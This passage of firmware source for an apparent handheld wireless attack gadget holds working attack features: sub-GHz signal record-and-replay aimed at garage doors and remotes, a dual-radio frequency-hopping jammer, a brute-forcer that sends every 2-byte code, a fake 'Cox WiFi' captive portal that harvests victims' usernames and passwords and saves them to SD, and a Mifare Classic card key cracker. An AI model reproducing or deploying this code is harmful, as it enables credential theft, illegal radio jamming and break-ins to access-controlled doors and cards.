          oled.setCursor(0, 44); oled.printf("@ %.2fMHz", scanStart + bestIdx * step);
        } else {
          oled.setCursor(0, 32); oled.print(F("No strong signals"));
        }
        oled.display();
      }
    }
  }
  needRedraw = true;
}

void handleScan(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return; }

  if (inBtn(tx,ty, 10,252, 56,38))  { scanStart = 299.0f; scanEnd = 320.0f; clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 71,252, 56,38))  { scanStart = 385.0f; scanEnd = 395.0f; clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 132,252, 56,38)) { scanStart = 432.0f; scanEnd = 436.0f; clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 193,252, 56,38)) { scanStart = 866.0f; scanEnd = 870.0f; clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 254,252, 56,38)) { scanStart = 913.0f; scanEnd = 918.0f; clickNav(); needRedraw = true; return; }

  if (inBtn(tx,ty, 10,296,  72,40)) { scanStart -= 10.0f; scanEnd -= 10.0f; clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 86,296,  72,40)) { scanStart -= 0.5f;  scanEnd -= 0.5f;  clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 162,296, 72,40)) { scanStart += 0.5f;  scanEnd += 0.5f;  clickNav(); needRedraw = true; return; }
  if (inBtn(tx,ty, 238,296, 72,40)) { scanStart += 10.0f; scanEnd += 10.0f; clickNav(); needRedraw = true; return; }

  if (inBtn(tx,ty, 10,342, 300,45)) {
    clickOk();
    runFreqScan();
    return;
  }
  if (inBtn(tx,ty, 10,392, 300,45)) {
    float mid = (scanStart + scanEnd) / 2;
    float range = (scanEnd - scanStart) * 1.5f;
    scanStart = mid - range/2; scanEnd = mid + range/2;
    clickNav(); needRedraw = true;
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: RSSI MONITOR
// ═══════════════════════════════════════════════════════════

void drawRssiMon() {
  tft.fillScreen(C_BG);
  drawHeader("RSSI Monitor");
  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 50);
  tft.printf("Freq: %.2f MHz", ccFreq);

  drawBtn(10, 260, 145, 45, "START", C_LGRAY, C_BG);
  drawBtn(165, 260, 145, 45, "STOP", C_LGRAY, C_BG);
  drawFooter("Monitors signal strength on current frequency");
}

void handleRssiMon(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return; }
  if (inBtn(tx,ty, 10,260, 145,45)) {
    clickOk();
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "CC_INIT,%c,%.2f,0,1,7,5,D3,91", activeRadio, ccFreq);
    sendAndWait(cmd);
    snprintf(cmd, sizeof(cmd), "CC_RX,%c", activeRadio);
    sendAndWait(cmd);

    int gx = 10, gy = 90, gw = 300, gh = 160;
    tft.fillRect(gx, gy, gw, gh, C_BG);
    tft.drawRect(gx-1, gy-1, gw+2, gh+2, C_DGREEN);
    int hpos = 0;

    int oHpos = 0;
    const int oGx = 0, oGy = 24, oGw = 128, oGh = 40;
    if (oledOk) {
      oled.clearDisplay(); oled.setTextColor(SSD1306_WHITE);
      oled.setTextSize(1);
      oled.setCursor(0, 0); oled.print(F("RSSI MONITOR"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 12); oled.printf("%.2f MHz", ccFreq);
      oled.drawRect(oGx, oGy, oGw, oGh, SSD1306_WHITE);
      oled.display();
    }

    while (true) {
      uint16_t x, y;
      if (tft.getTouch(&x, &y) && inBtn(x,y, 165,260, 145,45)) break;

      snprintf(cmd, sizeof(cmd), "CC_RSSI,%c", activeRadio);
      sendAndWait(cmd, 500);
      if (rspReady && strncmp(rspBuf, "RS,", 3) == 0) {
        int8_t rssi = atoi(rspBuf + 3);

        int barH = map(constrain(rssi, -110, -30), -110, -30, 0, gh);
        int px = gx + (hpos % gw);
        tft.fillRect(px, gy, 2, gh, C_BG);
        uint16_t col = (rssi > -50) ? C_RED : (rssi > -70) ? C_ORANGE : C_GREEN;
        tft.fillRect(px, gy + gh - barH, 2, barH, col);
        hpos += 2;
        if (hpos >= gw) hpos = 0;

        tft.fillRect(20, 70, 280, 20, C_BG);
        tft.setTextSize(2); tft.setTextColor(C_CYAN, C_BG);
        tft.setCursor(20, 70);
        tft.printf("%d dBm", rssi);

        if (oledOk) {
          int oBarH = map(constrain(rssi, -110, -30), -110, -30, 0, oGh - 2);
          int oPx = oGx + 1 + (oHpos % (oGw - 2));
          oled.drawLine(oPx, oGy + 1, oPx, oGy + oGh - 2, SSD1306_BLACK);
          oled.drawLine(oPx, oGy + oGh - 1 - oBarH, oPx, oGy + oGh - 2, SSD1306_WHITE);
          oHpos++;
          if (oHpos >= oGw - 2) oHpos = 0;
          oled.display();
        }
      }
      delay(50);
    }
    snprintf(cmd, sizeof(cmd), "CC_RXSTOP,%c", activeRadio);
    sendAndWait(cmd);
    needRedraw = true;
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: RECORD SIGNAL
// ═══════════════════════════════════════════════════════════

void drawRecord() {
  tft.fillScreen(C_BG);
  drawHeader("Record Signal");

  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 50);
  tft.printf("Freq: %.2f MHz", ccFreq);
  tft.setCursor(20, 80);
  tft.printf("Status: %s", recActive ? "RECORDING" : (recComplete ? "COMPLETE" : "Idle"));
  tft.setCursor(20, 110);
  tft.printf("Buffer: %d / 2048", recLen);

  drawBtn(10, 170, 95, 45, "REC", C_LGRAY, C_BG);
  drawBtn(110, 170, 95, 45, "STOP", C_LGRAY, C_BG);
  drawBtn(210, 170, 95, 45, "SAVE", C_LGRAY, C_BG);

  drawBtn(10, 225, 148, 45, "F -0.1", C_LGRAY, C_BG);
  drawBtn(162, 225, 148, 45, "F +0.1", C_LGRAY, C_BG);

  drawFooter("Records raw ASK/OOK signal (garage doors, remotes)");
}

void handleRecord(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (recActive) { char cmd[32]; snprintf(cmd, sizeof(cmd), "CC_RECSTOP,%c", activeRadio); sendAndWait(cmd); recActive = false; ledOff(); }
    recComplete = false; clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return;
  }
  if (inBtn(tx,ty, 10,170, 95,45)) {
    clickOk();
    char cmd[64]; snprintf(cmd, sizeof(cmd), "CC_REC,%c,%.2f", activeRadio, ccFreq);
    sendAndWait(cmd);
    recActive = true; recComplete = false; recLen = 0;
    ledBlue(); needRedraw = true;
  }
  if (inBtn(tx,ty, 110,170, 95,45)) {
    clickOk();
    char cmd[32]; snprintf(cmd, sizeof(cmd), "CC_RECSTOP,%c", activeRadio);
    sendAndWait(cmd);
    if (rspReady && strncmp(rspBuf, "RE,OFF,", 7) == 0) recLen = atoi(rspBuf + 7);
    recActive = false; ledOff();
    needRedraw = true;
  }
  if (inBtn(tx,ty, 210,170, 95,45)) { clickOk(); sdSaveRecording(); drawFooter("Recording saved!"); }
  if (inBtn(tx,ty, 10,225, 148,45))  { ccFreq -= 0.1f; if (ccFreq < 300.0f) ccFreq = 300.0f; clickNav(); needRedraw = true; }
  if (inBtn(tx,ty, 162,225, 148,45)) { ccFreq += 0.1f; if (ccFreq > 928.0f) ccFreq = 928.0f; clickNav(); needRedraw = true; }
}

void updateRecord() {
  if (!recActive) return;
  static uint32_t lastPoll = 0;
  if (millis() - lastPoll < 300) return;
  lastPoll = millis();
  char cmd[32]; snprintf(cmd, sizeof(cmd), "CC_RECPOLL,%c", activeRadio);
  sendAndWait(cmd, 500);
  if (rspReady && strncmp(rspBuf, "RP,", 3) == 0) {
    recLen = atoi(rspBuf + 3);
    tft.fillRect(150, 110, 160, 20, C_BG);
    tft.setTextSize(2); tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(150, 110);
    tft.printf("%d / 2048", recLen);
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: REPLAY SIGNAL
// ═══════════════════════════════════════════════════════════

void drawReplay() {
  tft.fillScreen(C_BG);
  drawHeader("Replay Signal");
  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 55);
  tft.printf("Buffer: %d bytes", recLen);
  tft.setCursor(20, 80);
  tft.printf("Freq: %.2f MHz", ccFreq);
  tft.setCursor(20, 105);
  tft.printf("Status: %s", replayDone ? "COMPLETE" : "Ready");

  drawBtn(10, 160, 145, 55, "REPLAY", C_LGRAY, C_BG);
  drawBtn(165, 160, 145, 55, "STOP", C_LGRAY, C_BG);
  drawFooter("Replays the last recorded signal");
}

void handleReplay(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { sendAndWait("CC_REPLAYSTOP"); ledOff(); clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return; }
  if (inBtn(tx,ty, 10,160, 145,55)) {
    clickOk();
    replayDone = false;
    char cmd[32]; snprintf(cmd, sizeof(cmd), "CC_REPLAY,%c,1", activeRadio);
    sendAndWait(cmd);
    ledGreen();
    tft.fillRect(20, 105, 280, 16, C_BG);
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 105);
    tft.print("Status: PLAYING");
  }
  if (inBtn(tx,ty, 165,160, 145,55)) {
    clickOk();
    sendAndWait("CC_REPLAYSTOP");
    replayDone = false;
    ledOff();
    tft.fillRect(20, 105, 280, 16, C_BG);
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 105);
    tft.print("Status: STOPPED");
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: JAMMER
// ═══════════════════════════════════════════════════════════

void drawJam() {
  tft.fillScreen(C_BG);
  drawHeader("Dual-Radio Jammer");

  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 58);
  tft.printf("%.2f MHz", ccFreq);

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(200, 63);
  tft.print(jamActive ? "JAMMING" : "IDLE");

  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 85);
  tft.print("Both CC1101s TX noise + freq hop");

  drawBtn(10,  105, 72, 42, "-10",  C_LGRAY, C_BG);
  drawBtn(86,  105, 72, 42, "-1",   C_LGRAY, C_BG);
  drawBtn(162, 105, 72, 42, "-.1",  C_LGRAY, C_BG);
  drawBtn(238, 105, 72, 42, "-.01", C_LGRAY, C_BG);

  drawBtn(10,  152, 72, 42, "+.01", C_LGRAY, C_BG);
  drawBtn(86,  152, 72, 42, "+.1",  C_LGRAY, C_BG);
  drawBtn(162, 152, 72, 42, "+1",   C_LGRAY, C_BG);
  drawBtn(238, 152, 72, 42, "+10",  C_LGRAY, C_BG);

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(10, 205);
  tft.print("PRESETS:");
  drawBtn(10,  220, 97, 42, "315",    C_LGRAY, C_BG);
  drawBtn(111, 220, 97, 42, "390",    C_LGRAY, C_BG);
  drawBtn(212, 220, 97, 42, "433.92", C_LGRAY, C_BG);

  drawBtn(10,  267, 148, 42, "868.35", C_LGRAY, C_BG);
  drawBtn(162, 267, 148, 42, "915",    C_LGRAY, C_BG);

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 320);
  tft.print("Both radios TX random noise across");
  tft.setCursor(20, 335);
  tft.print("8 freq hops around center. Research only.");

  drawBtn(10,  400, 147, 50, jamActive ? "JAMMING" : "START", C_LGRAY, C_BG);
  drawBtn(163, 400, 147, 50, "STOP", C_LGRAY, C_BG);
}

void handleJam(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (jamActive) { sendAndWait("CC_JAMSTOP"); jamActive = false; }
    clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return;
  }

  bool freqChanged = false;
  if (inBtn(tx,ty, 10,  105, 72,42)) { ccFreq -= 10.0f; freqChanged = true; }
  if (inBtn(tx,ty, 86,  105, 72,42)) { ccFreq -= 1.0f;  freqChanged = true; }
  if (inBtn(tx,ty, 162, 105, 72,42)) { ccFreq -= 0.1f;  freqChanged = true; }
  if (inBtn(tx,ty, 238, 105, 72,42)) { ccFreq -= 0.01f; freqChanged = true; }
  if (inBtn(tx,ty, 10,  152, 72,42)) { ccFreq += 0.01f; freqChanged = true; }
  if (inBtn(tx,ty, 86,  152, 72,42)) { ccFreq += 0.1f;  freqChanged = true; }
  if (inBtn(tx,ty, 162, 152, 72,42)) { ccFreq += 1.0f;  freqChanged = true; }
  if (inBtn(tx,ty, 238, 152, 72,42)) { ccFreq += 10.0f; freqChanged = true; }

  if (inBtn(tx,ty, 10,  220, 97,42)) { ccFreq = 315.0f;  freqChanged = true; }
  if (inBtn(tx,ty, 111, 220, 97,42)) { ccFreq = 390.0f;  freqChanged = true; }
  if (inBtn(tx,ty, 212, 220, 97,42)) { ccFreq = 433.92f; freqChanged = true; }
  if (inBtn(tx,ty, 10,  267, 148,42)) { ccFreq = 868.35f; freqChanged = true; }
  if (inBtn(tx,ty, 162, 267, 148,42)) { ccFreq = 915.0f;  freqChanged = true; }

  if (freqChanged) {
    if (ccFreq < 300.0f) ccFreq = 300.0f;
    if (ccFreq > 928.0f) ccFreq = 928.0f;
    clickNav();
    if (jamActive) {
      char cmd[64]; snprintf(cmd, sizeof(cmd), "CC_JAM,%.2f", ccFreq);
      sendAndWait(cmd);
    }
    needRedraw = true;
    return;
  }

  if (inBtn(tx,ty, 10,400, 147,50)) {
    clickOk();
    char cmd[64]; snprintf(cmd, sizeof(cmd), "CC_JAM,%.2f", ccFreq);
    sendAndWait(cmd);
    jamActive = true; needRedraw = true;
  }
  if (inBtn(tx,ty, 163,400, 147,50)) {
    clickOk();
    sendAndWait("CC_JAMSTOP");
    jamActive = false; needRedraw = true;
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: BRUTE FORCE
// ═══════════════════════════════════════════════════════════

void drawBrute() {
  tft.fillScreen(C_BG);
  drawHeader("Brute Force");
  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 50);
  tft.printf("Freq: %.2f MHz", ccFreq);
  tft.setCursor(20, 80);
  tft.printf("Code len: 2 bytes");
  tft.setCursor(20, 110);
  tft.printf("Status: %s", bfActive ? "RUNNING" : (bfDone ? "COMPLETE" : "Idle"));

  drawBtn(10, 160, 145, 55, "START", C_LGRAY, C_BG);
  drawBtn(165, 160, 145, 55, "STOP", C_LGRAY, C_BG);
  drawFooter("Sequentially sends all 2-byte codes");
}

void handleBrute(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (bfActive) sendAndWait("CC_BFSTOP");
    bfActive = false; bfDone = false; ledOff();
    clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return;
  }
  if (inBtn(tx,ty, 10,160, 145,55)) {
    clickOk();
    char cmd[64]; snprintf(cmd, sizeof(cmd), "CC_BF,%c,%.2f,2,10", activeRadio, ccFreq);
    sendAndWait(cmd);
    bfActive = true; bfDone = false; ledRed(); needRedraw = true;
  }
  if (inBtn(tx,ty, 165,160, 145,55)) {
    clickOk();
    sendAndWait("CC_BFSTOP");
    bfActive = false; ledOff(); needRedraw = true;
  }
}

void updateBrute() {
  if (!bfActive) return;
  static uint32_t lastPoll = 0;
  if (millis() - lastPoll < 500) return;
  lastPoll = millis();
  sendAndWait("CC_BFPOLL", 500);
  if (rspReady && strncmp(rspBuf, "BP,", 3) == 0) {
    tft.fillRect(20, 140, 280, 20, C_BG);
    tft.setTextSize(2); tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 140);
    tft.printf("Progress: %s", rspBuf + 3);
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: CW SIGNAL GENERATOR
// ═══════════════════════════════════════════════════════════

void drawCw() {
  tft.fillScreen(C_BG);
  drawHeader("Signal Generator");
  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 50);
  tft.printf("Freq: %.2f MHz", ccFreq);
  tft.setCursor(20, 80);
  tft.printf("Status: %s", cwActive ? "ON" : "Off");

  drawBtn(10, 160, 145, 55, "START", C_LGRAY, C_BG);
  drawBtn(165, 160, 145, 55, "STOP", C_LGRAY, C_BG);
  drawSmBtn(10, 230, 80, 25, "F -0.1", C_LGRAY);
  drawSmBtn(100, 230, 80, 25, "F +0.1", C_LGRAY);
  drawFooter("Generates continuous carrier wave at max power");
}

void handleCw(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (cwActive) sendAndWait("CC_CWSTOP");
    cwActive = false; ledOff();
    clickBack(); curScreen = SCR_SUBGHZ; needRedraw = true; return;
  }
  if (inBtn(tx,ty, 10,160, 145,55)) {
    clickOk();
    char cmd[64]; snprintf(cmd, sizeof(cmd), "CC_CW,%c,%.2f", activeRadio, ccFreq);
    sendAndWait(cmd);
    cwActive = true; ledRed(); needRedraw = true;
  }
  if (inBtn(tx,ty, 165,160, 145,55)) {
    clickOk();
    sendAndWait("CC_CWSTOP");
    cwActive = false; ledOff(); needRedraw = true;
  }
  if (inBtn(tx,ty, 10,230, 80,25))  { ccFreq -= 0.1f; if (ccFreq < 300.0f) ccFreq = 300.0f; clickNav(); needRedraw = true; }
  if (inBtn(tx,ty, 100,230, 80,25)) { ccFreq += 0.1f; if (ccFreq > 928.0f) ccFreq = 928.0f; clickNav(); needRedraw = true; }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: WIFI ATTACK
// ═══════════════════════════════════════════════════════════

void drawWifi() {
  tft.fillScreen(C_BG);
  drawHeader("WiFi Attack");

  if (!wifiScanned) {
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(40, 100);
    tft.print("Tap SCAN to start");
  } else {
    tft.setTextSize(1);
    int y = 55;
    int shown = min(wifiNetCount, 8);
    for (int i = 0; i < shown; i++) {
      uint16_t bg = (i == wifiSel) ? C_DGREEN : C_PANEL;
      tft.fillRoundRect(10, y, 300, 22, 3, bg);
      tft.setTextColor(C_CYAN, bg);
      tft.setCursor(14, y + 6);
      char line[50];
      const char* lock = (wifiNets[i].encType == WIFI_AUTH_OPEN) ? " " : "*";
      snprintf(line, sizeof(line), "%s%-16s Ch%d %ddBm%s",
        lock, wifiNets[i].ssid, wifiNets[i].channel, wifiNets[i].rssi,
        (i == wifiSel) ? " <" : "");
      tft.print(line);
      y += 25;
    }
    if (wifiNetCount == 0) {
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 60);
      tft.print("No networks found");
    }
  }

  drawBtn(5,  268, 95, 40, "SCAN", C_LGRAY, C_BG);
  drawBtn(105,268, 210, 40, "CAPTIVE PORTAL", C_LGRAY, C_BG);
}

void handleWifi(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    clickBack(); curScreen = SCR_HOME; needRedraw = true; return;
  }
  if (wifiScanned && wifiNetCount > 0) {
    int y = 55;
    for (int i = 0; i < min(wifiNetCount, 8); i++) {
      if (inBtn(tx, ty, 10, y, 300, 22)) {
        wifiSel = i; clickNav(); needRedraw = true; return;
      }
      y += 25;
    }
  }
  if (inBtn(tx,ty, 5,268, 95,40)) {
    clickOk();
    drawFooter("Scanning...");
    wifiScanNets();
    wifiSel = -1;
    needRedraw = true;
  }
  if (inBtn(tx,ty, 105,268, 210,40)) {
    clickOk();
    startEvilTwin();
    curScreen = SCR_EVIL; needRedraw = true;
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: EVIL TWIN ACTIVE
// ═══════════════════════════════════════════════════════════

void drawEvil() {
  tft.fillScreen(C_BG);
  drawHeader("Captive Portal");

  tft.setTextSize(2);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 58);
  tft.print("AP: Cox WiFi");

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, 82);
  tft.printf("Portal: http://%s", WiFi.softAPIP().toString().c_str());
  tft.setCursor(20, 98);
  tft.printf("Clients connected: %d", portalClients);

  tft.drawLine(10, 115, 310, 115, C_DGREEN);

  if (capturedPass[0]) {
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 125);
    tft.print("CAPTURED:");

    if (capturedUser[0]) {
      tft.setTextSize(1);
      tft.setTextColor(C_CYAN, C_BG);
      tft.setCursor(20, 150);
      tft.printf("User: %s", capturedUser);
    }

    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, capturedUser[0] ? 170 : 150);
    tft.print(capturedPass);

    drawBtn(10, 200, 300, 40, "SAVE", C_LGRAY, C_BG);
  } else {
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 150);
    tft.print("Waiting for victim...");
    tft.setTextSize(1);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 180);
    tft.print("Serving fake Cox WiFi login page");
  }

  drawBtn(10, 268, 300, 40, "STOP", C_LGRAY, C_BG);
}

void handleEvil(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54) || inBtn(tx,ty, 10,268, 300,40)) {
    clickBack();
    stopEvilTwin();
    curScreen = SCR_WIFI; needRedraw = true; return;
  }
  if (capturedPass[0] && inBtn(tx,ty, 10,200, 300,40)) {
    clickOk();
    sdSaveWifi("Cox WiFi", capturedUser, capturedPass);
    drawFooter("Credentials saved to SD!");
  }
}


// ═══════════════════════════════════════════════════════════
//  RFID KEY CRACK ENGINE
// ═══════════════════════════════════════════════════════════

int loadKeysFromSd() {
  if (!sdOk) return 0;
  File f = SD.open("/kodi/keys/mifare_keys.txt", FILE_READ);
  if (!f) return 0;
  sendAndWait("RFID_KEYCLR", 1000);

  char batch[1800];
  int batchPos = 0;
  int keyCount = 0;
  int batchCount = 0;
  char line[64];

  while (f.available()) {
    int len = f.readBytesUntil('\n', line, 63);
    line[len] = '\0';
    while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
    if (len != 12) continue;
    bool validHex = true;
    for (int i = 0; i < 12; i++) {
      char c = line[i];
      if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
        validHex = false; break;
      }
    }
    if (!validHex) continue;

    if (batchPos > 0) { batch[batchPos++] = ','; }
    memcpy(batch + batchPos, line, 12);
    batchPos += 12;
    batchCount++;
    keyCount++;

    if (batchCount >= 100) {
      batch[batchPos] = '\0';
      sendCmd("RFID_KEYADD,%s", batch);
      waitReply(2000);
      batchPos = 0;
      batchCount = 0;
    }
  }
  f.close();

  if (batchCount > 0) {
    batch[batchPos] = '\0';
    sendCmd("RFID_KEYADD,%s", batch);
    waitReply(2000);
  }

  return keyCount;
}

void startRfidCrack() {
  crackResultCount = 0;
  crackFound = 0;
  crackAttempts = 0;

  drawFooter("Loading keys from SD...");
  crackKeysTotal = loadKeysFromSd();
  if (crackKeysTotal == 0) { drawFooter("No keys found on SD!"); return; }
  crackKeysLoaded = true;

  drawFooter("Place card on reader...");
  sendCmd("RFID_CRACK");
  if (waitReply(5000)) {
    if (strncmp(rspBuf, "RC,ON,", 6) == 0) {
      crackActive = true;
      ledBlue();
      char* p = rspBuf + 6;
      char* comma = strchr(p, ',');
      if (comma) {
        p = comma + 1;
        comma = strchr(p, ',');
        if (comma) {
          *comma = '\0';
          strncpy(crackUid, p, 20);
          p = comma + 1;
          crackSak = (uint8_t)strtol(p, &comma, 16);
          if (comma && *comma == ',') crackSectors = atoi(comma + 1);
        }
      }
      crackTotal = crackSectors * 2 * crackKeysTotal;
      lastCrackPoll = millis();
    } else {
      drawFooter(rspBuf);
    }
  }
}

void stopRfidCrack() {
  sendAndWait("RFID_CRACKSTOP", 1000);
  crackActive = false;
  ledOff();
}

void saveCrackResults() {
  if (!sdOk || crackResultCount == 0) return;
  char path[48];
  int n = 1;
  do { snprintf(path, sizeof(path), "/kodi/rfid/crack_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (f) {
    f.printf("KODI,CRACK,1.0\n");
    f.printf("name=Crack %s\n", crackUid);
    f.printf("uid=%s\nsak=%02X\nsectors=%d\nfound=%d\n", crackUid, crackSak, crackSectors, crackResultCount);
    for (int i = 0; i < crackResultCount; i++) {
      f.printf("sector=%d,key%c=%s,data=%s\n",
        crackResults[i].sector, crackResults[i].keyType,
        crackResults[i].key, crackResults[i].data);
    }
    f.close();
  }
}

void drawRfidCrack() {
  tft.fillScreen(C_BG);
  drawHeader("RFID Key Crack");

  tft.setTextSize(2);
  int y = 55;

  if (!crackActive && crackResultCount == 0) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.printf("Keys on SD: %d", crackKeysLoaded ? crackKeysTotal : 0);
    y += 30;

    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.print("Place card on reader");
    y += 25;
    tft.setCursor(20, y);
    tft.print("then tap START to crack.");
    y += 40;

    drawBtn(10, y, 300, 55, "START CRACK", C_LGRAY, C_BG);
    drawFooter("Loads keys from /kodi/keys/mifare_keys.txt");
    return;
  }

  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(20, y);
  tft.printf("UID: %s", crackUid);
  y += 22;

  tft.setCursor(20, y);
  const char* cardType = "Unknown";
  if (crackSak == 0x08) cardType = "Mifare Classic 1K";
  else if (crackSak == 0x18) cardType = "Mifare Classic 4K";
  else if (crackSak == 0x00) cardType = "NTAG/Ultralight";
  else if (crackSak == 0x20) cardType = "Mifare Plus/DESFire";
  tft.printf("Type: %s (SAK=%02X)", cardType, crackSak);
  y += 28;

  if (crackActive) {
    int pct = crackTotal > 0 ? (crackAttempts * 100) / crackTotal : 0;
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.printf("Progress: %d%%  (%lu/%lu)", pct, crackAttempts, crackTotal);
    y += 22;

    int barW = 280;
    int filled = (pct * barW) / 100;
    tft.drawRect(10, y, barW, 16, C_DGREEN);
    tft.fillRect(11, y+1, filled, 14, C_GREEN);
    y += 24;

    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.printf("Found: %d sectors cracked", crackFound);
    y += 28;

    drawBtn(10, y + 10, 145, 45, "STOP", C_LGRAY, C_BG);
  } else {
    tft.setTextSize(3);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.print("CRACK COMPLETE");
    y += 32;

    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    if (crackFound > 0)
      tft.printf("%d sectors cracked!", crackFound);
    else
      tft.print("No keys found.");
    y += 28;

    drawBtn(10, y, 145, 45, "NEW CRACK", C_LGRAY, C_BG);
    if (crackResultCount > 0) {
      drawBtn(165, y, 145, 45, "SAVE", C_LGRAY, C_BG);
    }
    y += 55;
  }

  int ry = crackActive ? 240 : 225;
  int maxShow = (440 - ry) / 12;
  tft.setTextSize(1);
  for (int i = 0; i < crackResultCount && i < maxShow; i++) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(10, ry);
    tft.printf("S%02d %c=%s %s",
      crackResults[i].sector, crackResults[i].keyType,
      crackResults[i].key, crackResults[i].data);
    ry += 12;
  }
  if (crackResultCount > maxShow) {
    tft.setTextColor(C_LGRAY, C_BG);
    tft.setCursor(10, ry);
    tft.printf("... +%d more (saved to SD)", crackResultCount - maxShow);
  }
}

void handleRfidCrack(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (crackActive) stopRfidCrack();
    clickBack(); curScreen = prevScreen; needRedraw = true;
    return;
  }

  if (!crackActive && crackResultCount == 0) {
    int y = 150;
    if (inBtn(tx,ty, 10,y, 300,55)) {
      clickOk();
      startRfidCrack();
      needRedraw = true;
    }
  } else if (crackActive) {
    int y = 55 + 22 + 28 + 22 + 24 + 28;
    if (inBtn(tx,ty, 10,y+10, 145,45)) {
      clickOk();
      stopRfidCrack();
      needRedraw = true;
    }
  } else {
    int y = 55 + 22 + 28 + 32 + 28;
    if (inBtn(tx,ty, 10,y, 145,45)) {
      clickOk();
      crackResultCount = 0;
      crackFound = 0;
      needRedraw = true;
    }
    if (crackResultCount > 0 && inBtn(tx,ty, 165,y, 145,45)) {
      clickOk();
      saveCrackResults();
      drawFooter("Saved to SD!");
    }
  }
}

void updateRfidCrack() {
  if (!crackActive) return;
  if (millis() - lastCrackPoll < 500) return;
  lastCrackPoll = millis();

  sendCmd("RFID_CRACKPOLL");
  if (waitReply(500) && strncmp(rspBuf, "RP,", 3) == 0) {
    crackAttempts = strtoul(rspBuf + 3, NULL, 10);
    char* c1 = strchr(rspBuf + 3, ',');
    if (c1) {
      c1++;
      char* c2 = strchr(c1, ',');
      if (c2) {
        crackFound = atoi(c2 + 1);
      }
    }
    needRedraw = true;
  }
}

// ═══════════════════════════════════════════════════════════
//  CC1101 AUTO-SCAN ENGINE
// ═══════════════════════════════════════════════════════════

void drawAutoScan() {
  tft.fillScreen(C_BG);
  drawHeader("Auto-Scan Sub-GHz");

  tft.setTextSize(2);
  int y = 55;

  if (!autoScanActive) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y);
    tft.print("Sweeps all common bands:");
    y += 30;

    tft.setTextSize(1);
    for (int i = 0; i < 5; i++) {
      tft.setTextColor(C_CYAN, C_BG);
